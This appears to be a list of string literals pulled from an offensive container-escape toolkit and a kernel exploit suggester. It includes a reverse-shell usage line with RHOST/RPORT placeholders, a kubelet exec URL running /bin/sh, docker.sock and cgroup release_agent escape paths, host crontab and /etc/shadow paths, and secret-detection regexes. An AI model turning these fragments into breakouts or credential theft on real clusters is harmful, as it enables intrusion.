"""              $analysis_url"
"""   Comments: $comments"
"""   Download URL: $src_url"
"""   Exposure: $(displayExposure $RANK)"
"""   Requirements: $reqs"
"""   Tags: $tags"
"""   author: $author"
"""   exploit-db: $EXPLOIT_DB"
"""   ext-url: $ext_url"
"""  "
"""  ]\n"
""" != "
""" "
""" $state $feature ${wht}${CONFIG}${txtrst}"
""" && AVAILABLE="
""" && NAME="
""" && RANK="
""" && REQS="
""" && TAGS="
""" && ci.CgroupPath != "
""" && i.MountPoint == "
""" && tags="
""" && util.StringContains(m.Opts, "
""" (or "
""" (the shell payload will run by docker host)."
""" + "
""" + `"
""" + containerID + "
""" + f.Name() + "
""" + fmt.Sprintf("
""" + strings.Replace(u.Host, "
""" + value + "
""" - "
""" --checksec                   - list security related features for your HW/kernel"
""" --cvelist-file <file>        - provide file with Linux kernel CVEs list"
""" --kernelspace-only           - show only kernel vulnerabilities"
""" --skip-more-checks           - do not perform additional checks (kernel config, sysctl) to determine if exploit is applicable"
""" --skip-pkg-versions          - skip checking for exact userspace package version (helps to avoid false negatives)"
""" --userspace-only             - show only userspace vulnerabilities"
""" -A 10 | grep -Ev "
""" -O "
""" -V | --version               - print version of this script"
""" -a "
""" -a -e "
""" -a -n "
""" -arch "
""" -b | --fetch-binaries        - automatically downloads binary for matched exploit if available"
""" -d | --show-dos              - show also DoSes in results"
""" -f | --full                  - show full info about matched exploit"
""" -g | --short                 - show shorten info about matched exploit"
""" -h | --help                  - print this help"
""" -k | --kernel <version>      - provide kernel version"
""" -o "
""" -o -z "
""" -o \( "
""" -p | --pkglist-file <file>   - provide file with 'dpkg -l' or 'rpm -qa' command output"
""" -s | --fetch-sources         - automatically downloads source for matched exploit"
""" -u | --uname <string>        - provide 'uname -a' string"
""" / "
""" : "
""" = "
""" == "
""" =~ ^.*tgz|tar.gz|zip$ && -n "
""" =~ ^x86$ ]] && [ "
""" =~ ^x86_64$ ]] && [ "
""" >> %s"
""" ] && CONFIG="
""" ] && DISTRO=$(grep -s -E '^DISTRIB_RELEASE=|^VERSION_ID=' /etc/*-release | cut -d'=' -f2 | head -1 | tr -d '"
""" ] && OS="
""" ] && TAG="
""" ] && [ $opt_summary = "
""" ] && [ $opt_uname_string = "
""" ] && [ -n "
""" ] && [ -z "
""" ] && echo "
""" ] && echo -e "
""" ] && exitWithErrMsg "
""" ] && rm -f "
""" ] && src_url="
""" ] && tags="
""" in former err output, means exploit success."
""" or "
""" or \"
""" to devices.allow failed.\n"
""" | awk '{print $1"
""" | awk '{print $2"
""" | awk -F "
""" | grep "
""" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "
""" | grep '{') ] && tag_pkg_num=$(echo "
""" | grep -E "
""" | grep -E -i "
""" | grep -i "
""" | grep -o -i "
""" | grep -q -i '\-ARCH' && OS="
""" | grep -q -i '\-MANJARO' && OS="
""" | grep -q -i '\-deepin' && OS="
""" | grep -q -i '\.el' && OS="
""" | grep -q -i '\.fc' && OS="
""" | grep -q -i '\.mga' && OS="
""" | grep -q -i 'deb' && OS="
""" | grep -q -i 'ubuntu' && OS="
""" | head -1)"
""" | sed -${E} "
""" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g')"
""" || echo -e "
""" || port == "
"""!="
""""" "
"""""), "
""""", "
""""", &errors.CDKRuntimeError{Err: err, CustomMsg: "
""""", &errors.CDKRuntimeError{Err: tokenErr, CustomMsg: "
""""", &errors.CDKRuntimeError{Err: urlErr, CustomMsg: "
""""", errors.New("
""""", fmt.Errorf("
"""""},"
"""""}},{"
"""""}}],"
"""# CDK auto exploit via K8s backdoor daemonset"
"""# CDK auto exploit via docker.sock"
"""# CDK auto exploit via mounted device in privileged container"
"""#!/bin/bash \n %s"
"""#!/bin/sh\n"
"""#!/proc/self/exe"
"""#kubernetes.io/service-account-token"
"""$#"
"""$(echo "
"""$(grep -E '\ [0-9]+\.' "
"""$(grep -E '\.el[1-9]+[\._]' "
"""$(grep -E '\.fc[1-9]+'i "
"""$(grep -E '\.mga[1-9]+' "
"""$(grep ubuntu "
"""$1"
"""$2"
"""$3"
"""$@"
"""$ARCH"
"""$ARGS"
"""$AVAILABLE"
"""$CONFIG"
"""$CVELIST_FILE"
"""$DISTRO"
"""$ENABLE"
"""$ENABLE_REQS_NUM"
"""$EXP"
"""$EXPLOIT_DB"
"""$EXP_TEMP"
"""$FEATURE"
"""$IMAGE"
"""$IN"
"""$KCONFIG"
"""$KERNEL"
"""$KERNEL_ALL"
"""$NAME || $tags || $src_url"
"""$NAME"
"""$OS"
"""$PKGLIST_FILE"
"""$PKG_LIST"
"""$RANK"
"""$REQ"
"""$REQS"
"""$SCHEDULE_EXPR"
"""$SECRET_PARAM"
"""$SECRET_PARAM\"
"""$SHELLCMD$"
"""$SHELL_CMD"
"""$TAG"
"""$TAGS"
"""$UNAME_A"
"""$VERSION"
"""$analysis_url"
"""$author"
"""$bin_url"
"""$cmdStdout"
"""$comments"
"""$config"
"""$curVal"
"""$cve"
"""$distro"
"""$dos"
"""$entry"
"""$ext_url"
"""$host_path/cmd"
"""$i"
"""$line"
"""$opt_checksec_mode"
"""$opt_cvelist_file"
"""$opt_full"
"""$opt_kernel_only"
"""$opt_kernel_version"
"""$opt_pkglist_file"
"""$opt_show_dos"
"""$opt_skip_more_checks"
"""$opt_skip_pkg_versions"
"""$opt_summary"
"""$opt_uname_string"
"""$opt_userspace_only"
"""$pkg"
"""$pkgListFile"
"""$pkgName"
"""$pkglist_file"
"""$project_dir/cmd/cdk/cdk.go"
"""$reqRelation"
"""$reqs"
"""$sign"
"""$src_url"
"""$sysctlCondition"
"""$tag_distro"
"""$tag_distro_num"
"""$tag_distro_num_all"
"""$tag_pkg"
"""$tag_pkg_num"
"""$tags"
"""$uname"
"""$val"
"""${#EXPLOITS[@]} kernel space exploits"
"""${#EXPLOITS_USERSPACE[@]} user space exploits"
"""${1}${3}"
"""${1}0.0.0.0${3}"
"""${1}9443${3}"
"""${1}9444${3}"
"""${1}AlwaysAllow${3}"
"""${1}true${3}"
"""${2:4}"
"""${API_VERSION}"
"""${AVAILABLE:11}"
"""${EXPLOITS[@]}"
"""${EXPLOITS_USERSPACE[@]}"
"""${FEATURES[@]}"
"""${IMAGE}"
"""${IN#ver}"
"""${IN//[^0-9.]/}"
"""${IN:4}"
"""${IN:7}"
"""${K8S_APP}"
"""${KBUILD_OUTPUT:-/usr/src/linux}"
"""${NAME:0:8}"
"""${NAME:6}"
"""${NAME:9}"
"""${PRE_NAME}"
"""${RANK:6}"
"""${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo "
"""${REQS:6}"
"""${RHOST}"
"""${RPORT}"
"""${SHELL_CMD}"
"""${SORTED_EXPLOITS[@]}"
"""${TAGS:6}"
"""${TARGET_SERVICE_ACCOUNT}"
"""${arr[0]}"
"""${arr[1]}"
"""${arr[2]}"
"""${arr[3]}"
"""${array[0]}"
"""${array[@]}"
"""${bldwht}${NAME}${txtrst}"
"""${bldwht}Available information:${txtrst}"
"""${bldwht}Possible Exploits:${txtrst}"
"""${bldwht}Searching among:${txtrst}"
"""${cmd}"
"""${current_file}"
"""${exploits_to_sort[*]}"
"""${hostPath}"
"""${image}"
"""${ip}"
"""${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{$tag_pkg:$tag_pkg_num}"
"""${lightyellow}[ $tag_distro=$tag_distro_num ]${txtrst}{kernel:$tag_pkg_num}"
"""${lightyellow}[ ${TAG} ]${txtrst}"
"""${name}_$(basename $i)"
"""${name}_$(basename $src_url)"
"""${outputFile}"
"""${pdir}"
"""${port}"
"""${ppdir}"
"""${shellCmd}"
"""${tag_distro_num_all%{*}"
"""${tag_pkg_num}"
"""${tags%?}"
"""${tags_array[@]}"
"""${tags}${TAG},"
"""${txtgrn}$ARCH${txtrst}"
"""${txtgrn}$DISTRO${txtrst}"
"""${txtgrn}$OS${txtrst}"
"""${txtgrn}$PKGLIST_FILE${txtrst}"
"""${txtgrn}from current OS${txtrst}"
"""${txtgrn}performed${txtrst}"
"""${txtred}N/A${txtrst}"
"""${txtred}unrecognized file provided${txtrst}"
"""${yellow}[ ${TAG} ]${txtrst}"
"""%-80s\t%-10s\n"
"""%d"
"""%s %s"
"""%s \t %s \t %s"
"""%s read error, %v"
"""%s%s"
"""%s-%s"
"""%s.%s.%s"
"""%s/devices.allow"
"""%s: %s"
"""%s:%d"
"""%s:%s %s %s %s - %s %s %s"
"""%s:%s"
"""%s://%s"
"""%s://%s/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1"
"""%s:\n%s"
"""%s\"
"""%s\n"
"""%sv2/"
"""%v %v\n"
"""%v"
"""%v\n"
"""%v\t%v\t%v\t%v\n"
"""&tag="
"""',  # "
"""'\\s]"
"""'src-url' / 'bin-url' / 'exploit-db' entries are all empty for '$NAME' exploit - fix that. Aborting."
"""($(echo $REQ | cut -d'=' -f1))"
"""(.*)"
"""(.*?)"
"""(?i)\\bssh_|k8s|kubernetes|docker|gopath"
"""(?i)\\n/[^\\n]*linux(\\n|$)"
"""(?i)capeff:\\s*?([a-z0-9]+)\\s"
"""(?i)ssh|ftp|http|tomcat|nginx|engine|php|java|python|perl|ruby|kube|docker|\\bgo\\b"
"""(\"
"""(core dumped)\"
"""(dos"
"""(kube-apiserver\b[^"
"""(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})"
""") != "
""") && !strings.Contains(fstring, "
""") && !strings.Contains(resp, "
""") && !strings.Contains(resp, `"
""") + GreenBold.Sprint(title) + BlueBold.Sprint("
""") || strings.Contains(m.Fstype, "
""") || strings.Contains(string(data), "
""") || util.StringContains(args, "
""")"
""")(--audit-log-[^"
""")([^"
"""));%>"
"""), "
"""), os.Getenv("
"""), util.RedBold.Sprint("
""").String() + "
""").String()+"
"""* * * * *"
"""*/1 * * * *"
"""+containerID+"
"""+strconv.Itoa(found)+"
"""+strings.Replace(image, "
"""+strings.TrimSuffix(sysToken, "
"""+strings.TrimSuffix(token, "
"""+u.Port(), "
""", "
""", -1), "
""", 4000, "
""", []byte("
""", \"
""", cli.Args["
""", crontabCMD, "
""", false, "
""", fmt.Sprintf("
""", gjson.Get(json, "
""", len(devices), "
""", mountDir)}, "
""", mountPointPath, "
""", mzet, https://z-labs.eu, March 2019"
""", normalizeInput("
""", path, "
""", podName, "
""", reExecCmd.Process.Pid), []byte("
""", shellCommand, "
""", stat.Laddr.IP, stat.Laddr.Port), stat.Status, fmt.Sprintf("
""", strings.Join(ans, "
""", strings.Join(cmd, "
""", strings.Join(matched, "
""", this exploit will spawn a cmd. "
""", u.Gid, "
""", u.Uid, "
""", u.Username, "
""", url, "
""", util.RedBold.Sprint("
""","
""",\"
"""-"
"""--"
"""----"
"""------"
"""-----BEGIN DSA PRIVATE KEY-----"
"""-----BEGIN EC PRIVATE KEY-----"
"""-----BEGIN OPENSSH PRIVATE KEY-----"
"""-----BEGIN PGP PRIVATE KEY BLOCK-----"
"""-----BEGIN RSA PRIVATE KEY-----"
"""--address=127.0.0.1"
"""--advertise-address=192.168.0.150"
"""--advertise-address=192.168.0.151"
"""--advertise-address=192.168.0.152"
"""--allocate-node-cidrs=true"
"""--allow-privileged"
"""--allow-privileged=true"
"""--allow-privileged\s*?=\s*?)(.*?)("
"""--allow-untagged-cloud=true"
"""--annotations-prefix=nginx.ingress.kubernetes.io"
"""--anonymous-auth"
"""--anonymous-auth=true"
"""--anonymous-auth\s*?=\s*?)(.*?)("
"""--apiserver-count=500"
"""--audit-log-maxage=30"
"""--audit-log-maxbackup=10"
"""--audit-log-maxsize=100"
"""--audit-log-path=/var/log/kubernetes/kubernetes.audit"
"""--audit-policy-file=/etc/kubernetes/audit-policy.yml"
"""--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf"
"""--authentication-kubeconfig=/etc/kubernetes/scheduler.conf"
"""--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf"
"""--authorization-kubeconfig=/etc/kubernetes/scheduler.conf"
"""--authorization-mode"
"""--authorization-mode=AlwaysAllow"
"""--authorization-mode=Node,RBAC"
"""--authorization-mode\s*?=\s*?)(.*?)("
"""--bind-address=127.0.0.1"
"""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"
"""--client-ca-file=/etc/kubernetes/pki/ca.crt"
"""--cloud-config=/etc/kubernetes/config/cloud-config.conf"
"""--cloud-provider=alicloud"
"""--cloud-provider=external"
"""--cluster-cidr=172.20.0.0/16"
"""--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt"
"""--cluster-signing-key-file=/etc/kubernetes/pki/ca.key"
"""--clusterId=ca3869bd4dd884799a5abbb00c5e56fc4"
"""--config=/var/lib/kube-proxy/config.conf"
"""--configmap=$(POD_NAMESPACE)/nginx-configuration"
"""--configure-cloud-routes=true"
"""--controllers=*,bootstrapsigner,tokencleaner"
"""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"
"""--enable-aggregator-routing=true"
"""--enable-bootstrap-token-auth=true"
"""--endpoint-reconciler-type=lease"
"""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"
"""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"
"""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"
"""--etcd-keyfile=[^"
"""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"
"""--experimental-cluster-signing-duration=87600h0m0s"
"""--feature-gates=ServiceNodeExclusion=true"
"""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"
"""--full"
"""--horizontal-pod-autoscaler-use-rest-clients=true"
"""--hostname-override=$(NODE_NAME)"
"""--insecure-bind-address"
"""--insecure-bind-address=0.0.0.0"
"""--insecure-bind-address\s*?=\s*?)(.*?)("
"""--insecure-port"
"""--insecure-port=0"
"""--insecure-port=9443"
"""--insecure-port\s*?=\s*?)(.*?)("
"""--ip-masq"
"""--kube-subnet-mgr"
"""--kubeconfig=/etc/kubernetes/cloud-controller-manager.conf"
"""--kubeconfig=/etc/kubernetes/controller-manager.conf"
"""--kubeconfig=/etc/kubernetes/scheduler.conf"
"""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"
"""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"
"""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"
"""--leader-elect=true"
"""--list"
"""--logtostderr"
"""--node-cidr-mask-size=26"
"""--profiling=false"
"""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"
"""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"
"""--publish-service=$(POD_NAMESPACE)/nginx-ingress-lb"
"""--regionId=cn-beijing"
"""--requestheader-allowed-names=front-proxy-client"
"""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"
"""--requestheader-extra-headers-prefix=X-Remote-Extra-"
"""--requestheader-group-headers=X-Remote-Group"
"""--requestheader-username-headers=X-Remote-User"
"""--root-ca-file=/etc/kubernetes/pki/ca.crt"
"""--route-reconciliation-period=3m"
"""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"
"""--secure-port"
"""--secure-port=6443"
"""--secure-port=9444"
"""--secure-port\s*?=\s*?)(.*?)("
"""--service-account-key-file=/etc/kubernetes/pki/sa.pub"
"""--service-account-private-key-file=/etc/kubernetes/pki/sa.key"
"""--service-cluster-ip-range=172.21.0.0/20"
"""--service-node-port-range=30000-32767"
"""--sink=socket:tcp://monitor.csk.cn-beijing.aliyuncs.com:8093?clusterId=ca3869bd4dd884799a5abbb00c5e56fc4\u0026public=true"
"""--source=kubernetes:https://kubernetes.default"
"""--tcp-services-configmap=$(POD_NAMESPACE)/tcp-services"
"""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"
"""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"
"""--udp-services-configmap=$(POD_NAMESPACE)/udp-services"
"""--use-service-account-credentials=true"
"""--v=2"
"""--v=4"
"""-Wno-deprecated-declarations"
"""-Wno-undef -Wno-deprecated-declarations"
"""-Wno-undef-prefix=TARGET_OS_ -Wno-deprecated-declarations"
"""-c"
"""-conf"
"""-l"
"""-n"
"""-o"
"""-shadow"
"""-shadow\"
"""-t"
"""."
"""../../test"
"""./%s ."
"""./%s"
"""./cdk eva"
"""./cdk ifconfig"
"""./cdk run shim-pwn reverse <RHOST> <RPORT>\"
"""./cdk run test-poc"
"""./cdk-serverless /code 1.2.3.4 999"
"""./cdk_cli_path"
"""./cdk_mknod_result"
"""./cmd shim-pwn <SHELL_CMD>\"
"""./host_dev"
""".bin"
"""/"
"""/%s/%s/%s"
"""/:/host"
"""/Users/xy/"
"""/Users/xy/go"
"""/\"
"""/alicloud-monitor-controller"
"""/api"
"""/api/v1/configmaps"
"""/api/v1/namespaces"
"""/api/v1/namespaces/%s/pods"
"""/api/v1/namespaces/%s/pods/%s"
"""/api/v1/namespaces/default/pods"
"""/api/v1/namespaces/default/services"
"""/api/v1/namespaces/kube-system/pods"
"""/api/v1/namespaces/kube-system/pods/alicloud-application-controller-68999d69df-6fbgg"
"""/api/v1/namespaces/kube-system/pods/alicloud-disk-controller-74b658598f-rrztt"
"""/api/v1/namespaces/kube-system/pods/alicloud-monitor-controller-5599ddcdc7-8btss"
"""/api/v1/namespaces/kube-system/pods/aliyun-acr-credential-helper-6b4f98fdfb-ndzlt"
"""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-grvn8"
"""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-rpc6j"
"""/api/v1/namespaces/kube-system/pods/cloud-controller-manager-stdpv"
"""/api/v1/namespaces/kube-system/pods/coredns-8494d5b47-8clp4"
"""/api/v1/namespaces/kube-system/pods/coredns-8494d5b47-gllw6"
"""/api/v1/namespaces/kube-system/pods/flexvolume-652kv"
"""/api/v1/namespaces/kube-system/pods/flexvolume-dbmzf"
"""/api/v1/namespaces/kube-system/pods/flexvolume-gfzzw"
"""/api/v1/namespaces/kube-system/pods/flexvolume-hps4x"
"""/api/v1/namespaces/kube-system/pods/flexvolume-lvxmt"
"""/api/v1/namespaces/kube-system/pods/flexvolume-x9wvb"
"""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.150"
"""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.151"
"""/api/v1/namespaces/kube-system/pods/kube-apiserver-cn-beijing.192.168.0.152"
"""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.150"
"""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.151"
"""/api/v1/namespaces/kube-system/pods/kube-controller-manager-cn-beijing.192.168.0.152"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-5mdcn"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-9xgjv"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-b6qmx"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-fkbtg"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-fsjhn"
"""/api/v1/namespaces/kube-system/pods/kube-flannel-ds-ssx5g"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-master-bpgdm"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-master-rj7q5"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-master-xwcsf"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-84qsm"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-dfq46"
"""/api/v1/namespaces/kube-system/pods/kube-proxy-worker-p77nb"
"""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.150"
"""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.151"
"""/api/v1/namespaces/kube-system/pods/kube-scheduler-cn-beijing.192.168.0.152"
"""/api/v1/namespaces/kube-system/pods/metrics-server-54575fbd57-rf9bl"
"""/api/v1/namespaces/kube-system/pods/nginx-ingress-controller-5495b9fccf-6q5z2"
"""/api/v1/namespaces/kube-system/pods/nginx-ingress-controller-5495b9fccf-dtr8n"
"""/api/v1/secrets"
"""/apis"
"""/apis/${API_VERSION}/namespaces/kube-system/daemonsets"
"""/apis/apps/v1/namespaces/default/deployments"
"""/apis/batch/v1beta1/namespaces/kube-system/cronjobs"
"""/apis/policy/v1beta1/podsecuritypolicies"
"""/bin"
"""/bin/bash"
"""/bin/csh"
"""/bin/sh"
"""/cdk-fabric "
"""/cdk-fabric --help"
"""/cdk-fabric -v"
"""/cdk-fabric evaluate --full"
"""/cdk-fabric ifconfig"
"""/cdk-fabric kcurl"
"""/cdk-fabric nc"
"""/cdk-fabric probe 1.1.1.1 22 10 1000"
"""/cdk-fabric probe 1.1.1.1 22 50-999999 1000"
"""/cdk-fabric probe"
"""/cdk-fabric ps"
"""/cdk-fabric run --list"
"""/cdk-fabric run ak-leakage /tmp"
"""/cdk-fabric run ak-leakage"
"""/cdk-fabric run docker-sock-check /var/run/docker.sock"
"""/cdk-fabric run docker-sock-check"
"""/cdk-fabric run docker-sock-deploy /var/run/docker.sock alpine:latest"
"""/cdk-fabric run docker-sock-deploy"
"""/cdk-fabric run mount-cgroup \"
"""/cdk-fabric run mount-cgroup"
"""/cdk-fabric run mount-disk"
"""/cdk-fabric run mount-procfs /host_proc \"
"""/cdk-fabric run mount-procfs"
"""/cdk-fabric run reverse-shell"
"""/cdk-fabric run service-probe 127.0.0.1"
"""/cdk-fabric run service-probe 192.168.1.1-^^10"
"""/cdk-fabric run service-probe"
"""/cdk-fabric run shim-pwn \"
"""/cdk-fabric ucurl get /var/run/docker.sock http://127.0.0.1/info \"
"""/cdk-fabric ucurl"
"""/cdk-fabric vi"
"""/cdk_%s"
"""/cdk_cgexp_%s.sh"
"""/cdk_cgres_"
"""/cdk_linux_amd64 cmd"
"""/cgroup.procs"
"""/cloud-controller-manager"
"""/cmd_"
"""/cmdline"
"""/config.json"
"""/containers/"
"""/containers/create"
"""/dev"
"""/dev/null"
"""/dev/termination-log"
"""/etc"
"""/etc/"
"""/etc/cni/net.d"
"""/etc/coredns"
"""/etc/coredns/Corefile"
"""/etc/crontab"
"""/etc/hostname"
"""/etc/hosts"
"""/etc/kube-flannel/"
"""/etc/kubernetes"
"""/etc/kubernetes/"
"""/etc/kubernetes/audit-policy.yml"
"""/etc/kubernetes/config"
"""/etc/kubernetes/controller-manager.conf"
"""/etc/kubernetes/pki"
"""/etc/kubernetes/pki/etcd/ca.crt"
"""/etc/kubernetes/pki/etcd/peer.crt"
"""/etc/kubernetes/pki/etcd/peer.key"
"""/etc/kubernetes/scheduler.conf"
"""/etc/localtime"
"""/etc/pki"
"""/etc/shadow"
"""/etc/ssl/certs"
"""/exe"
"""/health"
"""/healthz"
"""/host-root"
"""/host-root/etc/crontab"
"""/host/"
"""/host/dev"
"""/host/etc"
"""/host/etc/"
"""/host/etc/crontab"
"""/host/proc"
"""/host/sys"
"""/host/usr/"
"""/host_root"
"""/images/create?fromImage=alpine&tag=latest"
"""/info"
"""/kubelet/|/dev/[\\w-]*?\\blog$|/etc/host[\\w]*?$|/etc/[\\w]*?\\.conf$"
"""/lib/modules"
"""/logs/"
"""/merged"
"""/metrics"
"""/metrics-server"
"""/nginx-ingress-controller"
"""/notify_on_release"
"""/opt/bin/flanneld"
"""/pods"
"""/proc mounted dir:\n%s\n"
"""/proc"
"""/proc/"
"""/proc/%d/gid_map"
"""/proc/%d/setgroups"
"""/proc/%d/uid_map"
"""/proc/%s/cgroup"
"""/proc/1/cgroup error: %v\n"
"""/proc/1/cgroup file content:"
"""/proc/net/route"
"""/proc/net/unix"
"""/proc/self/cgroup error: %v\n"
"""/proc/self/cgroup file added content (compare pid 1) :"
"""/proc/self/cgroup"
"""/proc/self/fd/"
"""/proc/self/mountinfo"
"""/proc/self/mounts"
"""/proc/self/status"
"""/proc/sys/kernel/randomize_va_space file content: %s"
"""/proc/sys/kernel/randomize_va_space"
"""/proc/sys/kernel/unprivileged_userns_clone"
"""/proc/sys/net/ipv4/conf/all/route_localnet"
"""/ready"
"""/registry/secrets/kube-system/"
"""/release_agent"
"""/run"
"""/run/user/"
"""/run/xtables.lock"
"""/sbin"
"""/snap/bin"
"""/start"
"""/sys"
"""/sys/fs/cgroup/cgroup.controllers"
"""/sys/fs/cgroup/devices"
"""/sys/fs/cgroup/devices/devices.allow"
"""/sys/kernel/core_pattern"
"""/systemd/"
"""/tmp"
"""/tmp/%s_%s"
"""/tmp/cdk_%s"
"""/tmp/cgrp_"
"""/usr/"
"""/usr/bin"
"""/usr/bin/debugfs"
"""/usr/games"
"""/usr/local/bin"
"""/usr/local/bin/kube-proxy"
"""/usr/local/games"
"""/usr/local/sbin"
"""/usr/sbin"
"""/v3/kv/range"
"""/var/lib/docker/devicemapper/mnt/"
"""/var/lib/kube-proxy"
"""/var/lib/kubelet"
"""/var/log"
"""/var/log/alicloud/"
"""/var/log/kubernetes"
"""/var/log/kubernetes/kubernetes.audit"
"""/var/run/docker.sock"
"""/var/run/secrets/kubernetes.io/serviceaccount"
"""/var/run/secrets/kubernetes.io/serviceaccount/token"
"""/version"
"""/x_"
"""0 %d 1"
"""0 * * * *"
"""0 0 * * *"
"""0"
"""0.0.0.0"
"""00000000a80425fb"
"""00000000a80c25fb"
"""00000000a82425fb"
"""05a70b7e-e3c9-4829-adf6-9176c49550cb"
"""05b56fcd-04ed-4795-a38c-faf97862045c"
"""0966af12-5f73-4395-be07-cf31f049ab4c"
"""0::/"
"""0c4dc85b-fd8a-4ed3-83d5-551b04d4eb91"
"""0f22d8bb971af79b9942ab7f38329446"
"""0x"
"""1"
"""1,2,3-5"
"""1.0.1-dev"
"""10.%d.%d.%d"
"""10000 61000"
"""1000Mi"
"""100Mi"
"""100m"
"""1024 65535\"
"""10250"
"""10254"
"""10255"
"""113cd782cb781eb2fdff73f2820a21d7"
"""127.0.0.1"
"""13"
"""1471ba59-65e2-4b9d-9259-8a657814049f"
"""14948498-2760-4cd1-87dd-dd2a1a85c826"
"""1606"
"""1608"
"""1642"
"""1644"
"""1661"
"""1666"
"""1696"
"""172.20.0.195"
"""172.20.0.196"
"""172.20.0.197"
"""172.20.0.198"
"""172.20.0.199"
"""172.20.0.200"
"""172.20.0.3"
"""172.20.1.2"
"""172.20.1.66"
"""1731"
"""1733"
"""1748"
"""1756"
"""1777"
"""1800"
"""1862"
"""1868"
"""1882"
"""1917"
"""192.168.0.150"
"""192.168.0.151"
"""192.168.0.152"
"""192.168.0.153"
"""192.168.0.154"
"""192.168.0.155"
"""192.168.0.23:2233"
"""1923"
"""1927"
"""1933"
"""1965"
"""198e43d8-dac0-4fd5-8c83-a2351cbd15f4"
"""2"
"""200Mi"
"""200m"
"""2020-04-08T04:05:04Z"
"""2020-04-08T04:05:10Z"
"""2020-04-08T04:05:16Z"
"""2020-04-08T04:05:17Z"
"""2020-04-08T04:06:43Z"
"""2020-04-08T04:06:53Z"
"""2020-04-08T04:06:57Z"
"""2020-04-08T04:06:58Z"
"""2020-04-08T04:06:59Z"
"""2020-04-08T04:08:23Z"
"""2020-04-08T04:08:31Z"
"""2020-04-08T04:08:44Z"
"""2020-04-08T04:08:45Z"
"""2020-04-08T04:08:46Z"
"""2020-04-08T04:08:52Z"
"""2020-04-08T04:08:55Z"
"""2020-04-08T04:09:01Z"
"""2020-04-08T04:09:02Z"
"""2020-04-08T04:09:03Z"
"""2020-04-08T04:09:04Z"
"""2020-04-08T04:09:59Z"
"""2020-04-08T04:10:02Z"
"""2020-04-08T04:12:29Z"
"""2020-04-08T04:12:30Z"
"""2020-04-08T04:12:31Z"
"""2020-04-08T04:12:32Z"
"""2020-04-08T04:12:33Z"
"""2020-04-08T04:12:34Z"
"""2020-04-08T04:12:35Z"
"""2020-04-08T04:12:36Z"
"""2020-04-08T04:12:37Z"
"""2020-04-08T04:12:38Z"
"""2020-04-08T04:12:39Z"
"""2020-04-08T04:12:41Z"
"""2020-04-08T04:12:42Z"
"""2020-04-08T04:12:43Z"
"""2020-04-08T04:12:44Z"
"""2020-04-08T04:12:45Z"
"""2020-04-08T04:12:46Z"
"""2020-04-08T04:12:47Z"
"""2020-04-08T04:12:48Z"
"""2020-04-08T04:12:49Z"
"""2020-04-08T04:12:51Z"
"""2020-04-08T04:12:52Z"
"""2020-04-08T04:12:53Z"
"""2020-04-08T04:12:54Z"
"""2020-04-08T04:12:56Z"
"""2020-04-08T04:12:57Z"
"""2020-04-08T04:12:58Z"
"""2020-04-08T04:12:59Z"
"""2020-04-08T04:13:03Z"
"""2020-04-08T04:13:04Z"
"""2020-04-08T04:13:20Z"
"""2020-04-08T04:13:22Z"
"""2020-04-08T04:13:23Z"
"""2020-04-08T04:13:29Z"
"""2020-04-08T04:13:34Z"
"""2020-04-08T04:13:38Z"
"""2020-04-08T04:13:43Z"
"""2020-04-08T12:05:04.169564569+08:00"
"""2020-04-08T12:05:05.300514759+08:00"
"""2020-04-08T12:06:53.045574636+08:00"
"""2020-04-08T12:06:53.834365706+08:00"
"""2020-04-08T12:08:40.982081019+08:00"
"""2020-04-08T12:08:40.982082844+08:00"
"""2020-04-08T12:08:43.94847775+08:00"
"""2020-04-08T12:08:53.764429839+08:00"
"""2020-04-08T12:09:02.695463405+08:00"
"""2020-09-10T07:23:17Z"
